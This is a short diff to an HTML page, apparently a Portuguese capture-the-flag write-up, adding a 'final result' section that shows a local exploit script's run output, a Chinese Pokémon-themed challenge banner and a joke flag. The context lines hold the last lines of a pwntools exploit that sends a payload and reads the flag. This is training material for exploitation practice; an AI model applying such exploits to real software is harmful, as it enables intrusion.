@@ -138,6 +138,24 @@ p.sendline(payload)
 # Lê a flag
 flag = p.recvall()
 print(flag.decode())</code></pre>
+
+<h2>Resultado Final</h2>
+<pre><code>untw0@pwn-student:~/challenge$ python3 exploit.py
+[+] Starting local process 'caminho/do/binario': pid 5700
+[+] Receiving all data: Done (6.85KB)
+[*] Process 'caminho/do/binario' stopped with exit code 0 (pid 5700)
+
+============================ 绿毛虫! ============================
+###
+### 在正式挑战 绿毛虫 之前，请仔细阅读并学习描述中的战斗技巧
+### 如果感到吃力，请先尝试战胜其他低等级的宝可梦
+### 祝你好运 :)
+###
+pwn{achou-que-ia-ter-flag-aqui-ne-hahaha} >:)
+
+### 2024年9月8日8:18:4 战斗记录: 绿毛虫 获胜
+### 努力提升自己的等级后，再来挑战吧！
+</code></pre>
     </div>
 </body>
 </html>
